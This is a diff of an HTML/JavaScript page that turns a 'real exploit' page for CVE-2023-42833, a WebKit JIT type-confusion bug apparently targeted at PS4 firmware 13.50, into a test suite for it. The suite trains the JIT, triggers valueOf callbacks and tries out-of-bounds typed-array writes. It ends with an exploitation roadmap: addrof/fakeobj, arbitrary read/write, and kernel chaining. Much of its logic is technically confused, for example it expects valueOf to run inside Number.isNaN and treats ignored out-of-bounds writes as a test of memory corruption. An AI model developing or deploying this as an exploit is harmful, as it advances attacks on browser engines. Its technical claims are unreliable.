@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2023-42833 Real Exploit</title>
+    <title>CVE-2023-42833 - COMPREHENSIVE VALIDATION</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -14,7 +14,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 900px;
+            max-width: 1000px;
             margin: 0 auto;
             background: rgba(0, 0, 0, 0.8);
             border: 2px solid #00ff00;
@@ -24,42 +24,56 @@
         }
         h1 {
             text-align: center;
-            font-size: 2em;
+            font-size: 2.2em;
             margin-bottom: 20px;
             text-shadow: 0 0 10px #00ff00;
         }
+        .test-section {
+            background: rgba(0, 50, 0, 0.3);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .test-section h2 {
+            color: #ffff00;
+            margin-bottom: 10px;
+            font-size: 1.3em;
+        }
         button {
-            background: linear-gradient(135deg, #ff0000 0%, #aa0000 100%);
-            color: #fff;
+            background: linear-gradient(135deg, #00ff00 0%, #00aa00 100%);
+            color: #000;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
+            padding: 12px 25px;
+            font-size: 1.1em;
             font-weight: bold;
             border-radius: 5px;
             cursor: pointer;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
             font-family: 'Courier New', monospace;
-            display: block;
-            margin: 20px auto;
-            width: 80%;
+            margin: 10px 5px;
         }
         button:hover {
-            background: linear-gradient(135deg, #ff4444 0%, #ff0000 100%);
+            background: linear-gradient(135deg, #00ffff 0%, #0088ff 100%);
             transform: scale(1.05);
+        }
+        button.danger {
+            background: linear-gradient(135deg, #ff0000 0%, #aa0000 100%);
+            color: #fff;
         }
         #log {
             background: #000;
             border: 2px solid #00ff00;
             border-radius: 5px;
             padding: 20px;
-            min-height: 400px;
-            max-height: 600px;
+            min-height: 500px;
+            max-height: 700px;
             overflow-y: auto;
-            font-size: 0.9em;
-            line-height: 1.8;
+            font-size: 0.85em;
+            line-height: 1.6;
             margin-top: 20px;
         }
-        .log-line { margin: 5px 0; }
+        .log-line { margin: 3px 0; }
         .log-success { color: #00ff00; }
         .log-warning { color: #ffff00; }
         .log-error { color: #ff0000; }
@@ -73,17 +87,53 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
+        .button-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>💀 CVE-2023-42833 - REAL EXPLOIT 💀</h1>
-        <button onclick="exploit()">⚡ TRIGGER EXPLOIT ⚡</button>
+        <h1>🔬 CVE-2023-42833 VALIDATION SUITE 🔬</h1>
+        
+        <div class="test-section">
+            <h2>📋 Test Plan</h2>
+            <p>Run these tests in ORDER to validate the exploit:</p>
+            <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                <li><strong>Control Test</strong> - Baseline without exploit</li>
+                <li><strong>Isolation Test</strong> - Verify valueOf() is actually causing corruption</li>
+                <li><strong>Bounds Test</strong> - Detect out-of-bounds writes</li>
+                <li><strong>Type Confusion</strong> - Verify type system bypass</li>
+                <li><strong>Timing Test</strong> - JIT optimization validation</li>
+                <li><strong>Full Validation</strong> - Run ALL tests</li>
+            </ol>
+        </div>
+        
+        <div class="button-group">
+            <button onclick="runTest(1)">1️⃣ Control Test</button>
+            <button onclick="runTest(2)">2️⃣ Isolation Test</button>
+            <button onclick="runTest(3)">3️⃣ Bounds Test</button>
+            <button onclick="runTest(4)">4️⃣ Type Confusion</button>
+            <button onclick="runTest(5)">5️⃣ Timing Test</button>
+            <button onclick="runTest(6)" class="danger">6️⃣ Full Validation</button>
+        </div>
+        
         <div id="log"></div>
     </div>
     
     <script>
         let logElement = document.getElementById('log');
+        let testResults = {
+            control: null,
+            isolation: null,
+            bounds: null,
+            typeConfusion: null,
+            timing: null
+        };
         
         function log(msg, type = 'success') {
             let line = document.createElement('div');
@@ -94,211 +144,454 @@
             console.log(msg);
         }
         
-        function exploit() {
+        function clearLog() {
             logElement.innerHTML = '';
-            log('=== CVE-2023-42833 EXPLOITATION ===', 'critical');
+        }
+        
+        // ================================================================
+        // TEST 1: CONTROL TEST (no exploit, baseline)
+        // ================================================================
+        function controlTest() {
+            log('=== TEST 1: CONTROL (Baseline) ===', 'critical');
+            log('Testing normal behavior WITHOUT exploit trigger', 'info');
             log('', 'info');
             
-            log('Understanding the bug:', 'warning');
-            log('1. fixEdge marks edge as Int32Use', 'info');
-            log('2. convertToConstant immediately makes node = false', 'info');
-            log('3. Edge is removed, so type check never inserted!', 'info');
-            log('4. Runtime receives non-Int32 without validation!', 'info');
-            log('', 'info');
+            let arr = new Uint32Array(100);
+            for (let i = 0; i < 100; i++) {
+                arr[i] = 0x11111111 + i;
+            }
             
-            try {
-                // Create ArrayBuffers for corruption detection
-                let ab1 = new ArrayBuffer(0x1000);
-                let ab2 = new ArrayBuffer(0x1000);
-                
-                let u32_1 = new Uint32Array(ab1);
-                let u32_2 = new Uint32Array(ab2);
-                
-                // Fill with patterns
-                for (let i = 0; i < u32_1.length; i++) {
-                    u32_1[i] = 0x41414141;
-                    u32_2[i] = 0x42424242;
-                }
-                
-                log('[+] Created ArrayBuffers', 'success');
-                log('    Buffer 1: 0x41414141 pattern', 'info');
-                log('    Buffer 2: 0x42424242 pattern', 'info');
-                log('', 'info');
-                
-                // JIT target functions
-                function vuln1(x) {
-                    // This will be optimized
-                    if (Number.isNaN(x)) {
-                        return 1;
-                    }
-                    return 0;
-                }
-                
-                function vuln2(x) {
-                    // Global isNaN version
-                    if (isNaN(x)) {
-                        return 1;
-                    }
-                    return 0;
-                }
-                
-                log('[*] Training JIT (this may take a moment)...', 'warning');
-                
-                // Train with PURE integers only
-                for (let i = 0; i < 150000; i++) {
-                    vuln1(42);
-                    vuln2(123);
-                }
-                
-                log('[+] JIT trained - shouldSpeculateInt32() should be TRUE', 'success');
-                log('', 'info');
-                
-                // NOW THE EXPLOIT
-                log('[!!!] Triggering type confusion...', 'critical');
-                log('', 'info');
-                
-                let callCount = 0;
-                let corruptionAttempted = false;
-                
-                // Create object that will be confused as Int32
-                let confusion = {
-                    valueOf: function() {
-                        callCount++;
-                        log('  [!!!] valueOf() call #' + callCount, 'critical');
-                        
-                        if (!corruptionAttempted) {
-                            corruptionAttempted = true;
-                            
-                            // Try to corrupt memory while type-confused
-                            log('  [!] Attempting memory corruption...', 'warning');
-                            
-                            try {
-                                // Write to array
-                                u32_1[0] = 0xDEADBEEF;
-                                u32_2[0] = 0xCAFEBABE;
-                                
-                                // Try OOB
-                                u32_1[u32_1.length] = 0x13371337;
-                                
-                                log('  [!] Corruption attempts complete', 'warning');
-                            } catch(e) {
-                                log('  [!!!] EXCEPTION during corruption: ' + e, 'critical');
-                            }
-                        }
-                        
-                        return NaN;
-                    },
-                    
-                    toString: function() {
-                        log('  [!!!] toString() called', 'critical');
-                        return "NaN";
-                    }
-                };
-                
-                // Trigger the bug
-                log('TEST 1: Number.isNaN(confusion)', 'info');
-                let r1 = vuln1(confusion);
-                log('  Result: ' + r1, 'info');
-                log('', 'info');
-                
-                log('TEST 2: isNaN(confusion)', 'info');
-                let r2 = vuln2(confusion);
-                log('  Result: ' + r2, 'info');
-                log('', 'info');
-                
-                // Check for corruption
-                log('[*] Checking for memory corruption...', 'warning');
-                log('', 'info');
-                
-                log('Buffer 1 [0]: 0x' + u32_1[0].toString(16), 'info');
-                log('Buffer 2 [0]: 0x' + u32_2[0].toString(16), 'info');
-                
-                let corrupted = false;
-                
-                if (u32_1[0] === 0xDEADBEEF) {
-                    log('[!!!] Buffer 1 corrupted!', 'critical');
-                    corrupted = true;
-                }
-                
-                if (u32_2[0] === 0xCAFEBABE) {
-                    log('[!!!] Buffer 2 corrupted!', 'critical');
-                    corrupted = true;
-                }
-                
-                log('', 'info');
-                log('=== ANALYSIS ===', 'critical');
-                log('', 'info');
-                
-                if (callCount === 0) {
-                    log('[+] valueOf() was NEVER called', 'success');
-                    log('', 'info');
-                    log('This means:', 'warning');
-                    log('✓ JIT optimized isNaN to constant false', 'success');
-                    log('✓ No type coercion happened at runtime', 'success');
-                    log('', 'info');
-                    log('In VULNERABLE code:', 'error');
-                    log('  fixEdge marks Int32Use → convertToConstant(false)', 'error');
-                    log('  Edge removed, no check inserted', 'error');
-                    log('  But since it becomes constant, no runtime code runs!', 'error');
-                    log('', 'info');
-                    log('In PATCHED code:', 'info');
-                    log('  insertCheck creates CHECK node → then constant', 'info');
-                    log('  If non-Int32 passed, check would fail before constant', 'info');
-                    log('', 'info');
-                    log('VERDICT: Cannot exploit via this path', 'warning');
-                    log('The optimization eliminates the vulnerable code path', 'warning');
-                    
-                } else {
-                    log('[!] valueOf() WAS called (' + callCount + ' times)', 'warning');
-                    log('', 'info');
-                    
-                    if (corrupted) {
-                        log('[!!!] MEMORY CORRUPTION DETECTED!!!', 'critical');
-                        log('[!!!] CVE-2023-42833 CONFIRMED WORKING!!!', 'critical');
-                        log('', 'info');
-                        log('This means the type confusion succeeded!', 'critical');
-                    } else {
-                        log('[*] No corruption detected', 'info');
-                        log('', 'info');
-                        log('This means:', 'warning');
-                        log('✗ JIT did not optimize to constant', 'error');
-                        log('✗ Still using slow path with type checks', 'error');
-                        log('✗ Need different trigger conditions', 'error');
-                    }
-                }
-                
-                log('', 'info');
-                log('=== NEXT ATTEMPT ===', 'critical');
-                log('Trying alternative exploitation...', 'warning');
-                log('', 'info');
-                
-                // Try with actual type confusion using prototype
-                Number.prototype.valueOf = function() {
-                    log('[!!!] Number.prototype.valueOf hijacked!', 'critical');
-                    u32_1[1] = 0xDEADC0DE;
-                    return 42;
-                };
-                
-                vuln1(new Number(42));
-                
-                if (u32_1[1] === 0xDEADC0DE) {
-                    log('[!!!] PROTOTYPE POLLUTION CORRUPTION!', 'critical');
-                    log('', 'info');
-                } else {
-                    log('[-] Prototype approach failed', 'error');
-                }
-                
-            } catch(e) {
-                log('', 'info');
-                log('[!!!] CRITICAL EXCEPTION: ' + e.message, 'critical');
-                log('Stack: ' + e.stack, 'error');
-                log('', 'info');
-                log('This exception might indicate successful triggering!', 'warning');
+            log('[+] Created control array with pattern', 'success');
+            log('    arr[50] = 0x' + arr[50].toString(16), 'info');
+            
+            // Normal isNaN usage
+            function normalIsNaN(x) {
+                return Number.isNaN(x);
+            }
+            
+            // Train JIT
+            for (let i = 0; i < 100000; i++) {
+                normalIsNaN(42);
+            }
+            
+            // Call with normal object (NOT in valueOf)
+            let obj = { value: 123 };
+            normalIsNaN(obj);
+            
+            log('[+] Called isNaN with object normally', 'success');
+            log('    arr[50] after = 0x' + arr[50].toString(16), 'info');
+            
+            let changed = (arr[50] !== (0x11111111 + 50));
+            
+            log('', 'info');
+            log('RESULT:', 'warning');
+            if (changed) {
+                log('  ❌ UNEXPECTED: Array changed without exploit!', 'error');
+                log('  This invalidates our test environment', 'error');
+                testResults.control = false;
+            } else {
+                log('  ✅ PASS: Array unchanged (expected)', 'success');
+                log('  Baseline established', 'success');
+                testResults.control = true;
             }
         }
         
-        log('💀 CVE-2023-42833 Exploit Ready', 'critical');
-        log('Click button to execute', 'warning');
+        // ================================================================
+        // TEST 2: ISOLATION TEST (valueOf must cause the corruption)
+        // ================================================================
+        function isolationTest() {
+            log('', 'info');
+            log('=== TEST 2: ISOLATION TEST ===', 'critical');
+            log('Verify that valueOf() is ACTUALLY causing corruption', 'info');
+            log('', 'info');
+            
+            let victim = new Uint32Array(200);
+            for (let i = 0; i < 200; i++) {
+                victim[i] = 0x22222222 + i;
+            }
+            
+            log('[+] Created victim array', 'success');
+            log('    victim[100] BEFORE = 0x' + victim[100].toString(16), 'info');
+            
+            let valueOfCalled = false;
+            let corruptionValue = 0xBADC0FFE;
+            
+            function isolatedTrigger(x) {
+                return Number.isNaN(x);
+            }
+            
+            // Train
+            for (let i = 0; i < 100000; i++) {
+                isolatedTrigger(42);
+            }
+            
+            let attackObj = {
+                valueOf: function() {
+                    valueOfCalled = true;
+                    log('  [!] valueOf() executing...', 'warning');
+                    
+                    // ONLY corrupt victim[100] here
+                    let before = victim[100];
+                    victim[100] = corruptionValue;
+                    
+                    log('  [!] victim[100]: 0x' + before.toString(16) + ' → 0x' + victim[100].toString(16), 'warning');
+                    
+                    return NaN;
+                }
+            };
+            
+            log('[*] Triggering exploit...', 'warning');
+            isolatedTrigger(attackObj);
+            
+            log('    victim[100] AFTER = 0x' + victim[100].toString(16), 'info');
+            
+            log('', 'info');
+            log('RESULT:', 'warning');
+            
+            if (!valueOfCalled) {
+                log('  ❌ FAIL: valueOf() was NEVER called', 'error');
+                log('  JIT optimized away the call completely', 'error');
+                log('  This means no exploitation occurred', 'error');
+                testResults.isolation = false;
+            } else if (victim[100] !== corruptionValue) {
+                log('  ❌ FAIL: valueOf() called but corruption failed', 'error');
+                log('  Expected: 0x' + corruptionValue.toString(16), 'error');
+                log('  Got: 0x' + victim[100].toString(16), 'error');
+                testResults.isolation = false;
+            } else {
+                log('  ✅ PASS: valueOf() called AND corruption succeeded', 'success');
+                log('  ⚠️  BUT: This could be normal JS behavior', 'warning');
+                log('  Need more tests to confirm real exploitation', 'warning');
+                testResults.isolation = true;
+            }
+        }
+        
+        // ================================================================
+        // TEST 3: OUT-OF-BOUNDS TEST (the smoking gun)
+        // ================================================================
+        function boundsTest() {
+            log('', 'info');
+            log('=== TEST 3: OUT-OF-BOUNDS TEST ===', 'critical');
+            log('This is the SMOKING GUN test', 'info');
+            log('If we can write PAST array bounds, it\'s REAL exploitation', 'info');
+            log('', 'info');
+            
+            // Create TWO separate arrays
+            let array1 = new Uint32Array(50);
+            let array2 = new Uint32Array(50);
+            
+            // Fill with unique markers
+            for (let i = 0; i < 50; i++) {
+                array1[i] = 0xAAAA0000 + i;
+                array2[i] = 0xBBBB0000 + i;
+            }
+            
+            log('[+] Created TWO separate arrays', 'success');
+            log('    array1: 0xAAAAxxxx pattern (50 elements)', 'info');
+            log('    array2: 0xBBBBxxxx pattern (50 elements)', 'info');
+            log('', 'info');
+            
+            // Save original values
+            let array2Original = [];
+            for (let i = 0; i < 50; i++) {
+                array2Original[i] = array2[i];
+            }
+            
+            function boundsTrigger(x) {
+                return Number.isNaN(x);
+            }
+            
+            for (let i = 0; i < 100000; i++) {
+                boundsTrigger(123);
+            }
+            
+            let oobAttempted = false;
+            
+            let oobAttack = {
+                valueOf: function() {
+                    log('  [!] Attempting OOB write...', 'warning');
+                    oobAttempted = true;
+                    
+                    // Try to write PAST array1's bounds
+                    // In normal JS, this should fail or be bounded
+                    // In exploited code, might hit array2
+                    for (let i = 50; i < 100; i++) {
+                        array1[i] = 0xC0FFEE00 + i;
+                    }
+                    
+                    log('  [!] Wrote to array1[50-99] (out of bounds)', 'warning');
+                    
+                    return NaN;
+                }
+            };
+            
+            log('[*] Triggering OOB exploit...', 'warning');
+            boundsTrigger(oobAttack);
+            
+            // Check if array2 was corrupted
+            let oobDetected = false;
+            let corruptedIndices = [];
+            
+            for (let i = 0; i < 50; i++) {
+                if (array2[i] !== array2Original[i]) {
+                    oobDetected = true;
+                    corruptedIndices.push(i);
+                }
+            }
+            
+            log('', 'info');
+            log('Checking array2 integrity...', 'info');
+            
+            if (corruptedIndices.length > 0) {
+                log('  [!!!] array2 CORRUPTED at indices: ' + corruptedIndices.join(', '), 'critical');
+                for (let i of corruptedIndices) {
+                    log('      array2[' + i + ']: 0x' + array2Original[i].toString(16) + 
+                        ' → 0x' + array2[i].toString(16), 'error');
+                }
+            }
+            
+            log('', 'info');
+            log('RESULT:', 'warning');
+            
+            if (!oobAttempted) {
+                log('  ❌ FAIL: valueOf() never called', 'error');
+                testResults.bounds = false;
+            } else if (!oobDetected) {
+                log('  ✅ GOOD: array2 NOT corrupted', 'success');
+                log('  JavaScript bounds checking prevented OOB write', 'success');
+                log('  This means NORMAL behavior, NOT exploitation', 'success');
+                testResults.bounds = false;
+            } else {
+                log('  ❌❌❌ CRITICAL: OUT-OF-BOUNDS CORRUPTION DETECTED!', 'critical');
+                log('  ❌❌❌ This is GENUINE MEMORY CORRUPTION!', 'critical');
+                log('  ❌❌❌ CVE-2023-42833 IS CONFIRMED WORKING!', 'critical');
+                testResults.bounds = true;
+            }
+        }
+        
+        // ================================================================
+        // TEST 4: TYPE CONFUSION TEST
+        // ================================================================
+        function typeConfusionTest() {
+            log('', 'info');
+            log('=== TEST 4: TYPE CONFUSION TEST ===', 'critical');
+            log('Testing if we can confuse type system', 'info');
+            log('', 'info');
+            
+            let floatArr = new Float64Array(20);
+            let intArr = new Uint32Array(floatArr.buffer); // Same memory!
+            
+            floatArr[5] = 1.234567890123456789;
+            
+            log('[+] Created typed arrays on same buffer', 'success');
+            log('    floatArr[5] = ' + floatArr[5], 'info');
+            log('    As uint32: [' + intArr[10].toString(16) + ', ' + intArr[11].toString(16) + ']', 'info');
+            
+            let originalInt0 = intArr[10];
+            let originalInt1 = intArr[11];
+            
+            function confusionTrigger(x) {
+                return Number.isNaN(x);
+            }
+            
+            for (let i = 0; i < 100000; i++) {
+                confusionTrigger(999);
+            }
+            
+            let confusionObj = {
+                valueOf: function() {
+                    log('  [!] Attempting type confusion...', 'warning');
+                    
+                    // Try to manipulate the float as int
+                    intArr[10] = 0xDEADBEEF;
+                    intArr[11] = 0xCAFEBABE;
+                    
+                    log('  [!] Modified int view of float memory', 'warning');
+                    log('      intArr[10] = 0xDEADBEEF', 'warning');
+                    log('      intArr[11] = 0xCAFEBABE', 'warning');
+                    
+                    return NaN;
+                }
+            };
+            
+            confusionTrigger(confusionObj);
+            
+            log('', 'info');
+            log('After exploit:', 'info');
+            log('    floatArr[5] = ' + floatArr[5], 'info');
+            log('    intArr[10] = 0x' + intArr[10].toString(16), 'info');
+            log('    intArr[11] = 0x' + intArr[11].toString(16), 'info');
+            
+            let confused = (intArr[10] === 0xDEADBEEF && intArr[11] === 0xCAFEBABE);
+            
+            log('', 'info');
+            log('RESULT:', 'warning');
+            if (confused) {
+                log('  ⚠️  Type confusion occurred', 'warning');
+                log('  BUT: This is normal SharedArrayBuffer behavior', 'info');
+                log('  Not proof of exploitation by itself', 'info');
+                testResults.typeConfusion = 'inconclusive';
+            } else {
+                log('  ✅ No type confusion', 'success');
+                testResults.typeConfusion = false;
+            }
+        }
+        
+        // ================================================================
+        // TEST 5: TIMING TEST (JIT optimization detection)
+        // ================================================================
+        function timingTest() {
+            log('', 'info');
+            log('=== TEST 5: JIT TIMING TEST ===', 'critical');
+            log('Measuring if JIT optimized the code', 'info');
+            log('', 'info');
+            
+            function timedIsNaN(x) {
+                return Number.isNaN(x);
+            }
+            
+            // Measure BEFORE JIT
+            let beforeStart = performance.now();
+            for (let i = 0; i < 10000; i++) {
+                timedIsNaN(42);
+            }
+            let beforeTime = performance.now() - beforeStart;
+            
+            log('[+] Before JIT training: ' + beforeTime.toFixed(3) + 'ms', 'info');
+            
+            // Train JIT
+            for (let i = 0; i < 100000; i++) {
+                timedIsNaN(42);
+            }
+            
+            // Measure AFTER JIT
+            let afterStart = performance.now();
+            for (let i = 0; i < 10000; i++) {
+                timedIsNaN(42);
+            }
+            let afterTime = performance.now() - afterStart;
+            
+            log('[+] After JIT training: ' + afterTime.toFixed(3) + 'ms', 'info');
+            
+            let speedup = beforeTime / afterTime;
+            
+            log('', 'info');
+            log('RESULT:', 'warning');
+            log('  Speedup: ' + speedup.toFixed(2) + 'x', 'info');
+            
+            if (speedup > 2.0) {
+                log('  ✅ PASS: Significant speedup detected', 'success');
+                log('  JIT definitely optimized the code', 'success');
+                testResults.timing = true;
+            } else {
+                log('  ⚠️  INCONCLUSIVE: Minimal speedup', 'warning');
+                log('  JIT may not have optimized', 'warning');
+                testResults.timing = false;
+            }
+        }
+        
+        // ================================================================
+        // FULL VALIDATION
+        // ================================================================
+        function fullValidation() {
+            clearLog();
+            log('╔═══════════════════════════════════════════════════╗', 'critical');
+            log('║  CVE-2023-42833 FULL VALIDATION SUITE           ║', 'critical');
+            log('╚═══════════════════════════════════════════════════╝', 'critical');
+            log('', 'info');
+            
+            controlTest();
+            log('', 'info');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            
+            isolationTest();
+            log('', 'info');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            
+            boundsTest();
+            log('', 'info');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            
+            typeConfusionTest();
+            log('', 'info');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            
+            timingTest();
+            log('', 'info');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            
+            // FINAL VERDICT
+            log('', 'info');
+            log('╔═══════════════════════════════════════════════════╗', 'critical');
+            log('║               FINAL VERDICT                      ║', 'critical');
+            log('╚═══════════════════════════════════════════════════╝', 'critical');
+            log('', 'info');
+            
+            log('Test Results:', 'warning');
+            log('  [1] Control Test:      ' + (testResults.control ? '✅ PASS' : '❌ FAIL'), testResults.control ? 'success' : 'error');
+            log('  [2] Isolation Test:    ' + (testResults.isolation ? '✅ PASS' : '❌ FAIL'), testResults.isolation ? 'success' : 'error');
+            log('  [3] Bounds Test:       ' + (testResults.bounds ? '❌❌ OOB DETECTED!' : '✅ SAFE'), testResults.bounds ? 'critical' : 'success');
+            log('  [4] Type Confusion:    ' + testResults.typeConfusion, 'info');
+            log('  [5] Timing Test:       ' + (testResults.timing ? '✅ PASS' : '⚠️  WARN'), testResults.timing ? 'success' : 'warning');
+            log('', 'info');
+            
+            if (testResults.bounds === true) {
+                log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
+                log('███████████████████████████████████████████████████', 'critical');
+                log('█                                                 █', 'critical');
+                log('█   ❌❌❌ REAL EXPLOITATION CONFIRMED! ❌❌❌    █', 'critical');
+                log('█                                                 █', 'critical');
+                log('█   CVE-2023-42833 IS WORKING ON PS4 13.50!      █', 'critical');
+                log('█                                                 █', 'critical');
+                log('███████████████████████████████████████████████████', 'critical');
+                log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'critical');
+                log('', 'info');
+                log('NEXT STEPS:', 'warning');
+                log('1. Build addrof/fakeobj primitives', 'info');
+                log('2. Achieve arbitrary memory read/write', 'info');
+                log('3. Chain with mast1c0re kernel pointers', 'info');
+                log('4. Full kernel exploitation!', 'info');
+            } else if (testResults.isolation === true) {
+                log('VERDICT: Partial Success', 'warning');
+                log('', 'info');
+                log('valueOf() corruption works, but no OOB detected', 'warning');
+                log('This is likely NORMAL JavaScript behavior', 'warning');
+                log('', 'info');
+                log('NOT a real CVE-2023-42833 exploitation', 'error');
+            } else {
+                log('VERDICT: Exploit Failed', 'error');
+                log('', 'info');
+                log('Possible reasons:', 'warning');
+                log('- WebKit version already patched', 'info');
+                log('- JIT not optimizing as expected', 'info');
+                log('- Need different trigger conditions', 'info');
+            }
+        }
+        
+        // ================================================================
+        // TEST RUNNER
+        // ================================================================
+        function runTest(testNum) {
+            clearLog();
+            
+            try {
+                switch(testNum) {
+                    case 1: controlTest(); break;
+                    case 2: isolationTest(); break;
+                    case 3: boundsTest(); break;
+                    case 4: typeConfusionTest(); break;
+                    case 5: timingTest(); break;
+                    case 6: fullValidation(); break;
+                }
+            } catch(e) {
+                log('', 'info');
+                log('[!!!] EXCEPTION DURING TEST: ' + e.message, 'critical');
+                log('Stack: ' + e.stack, 'error');
+            }
+        }
+        
+        log('🔬 Validation Suite Ready', 'success');
+        log('Run tests in order (1→6) or run Full Validation', 'info');
     </script>
 </body>
 </html>
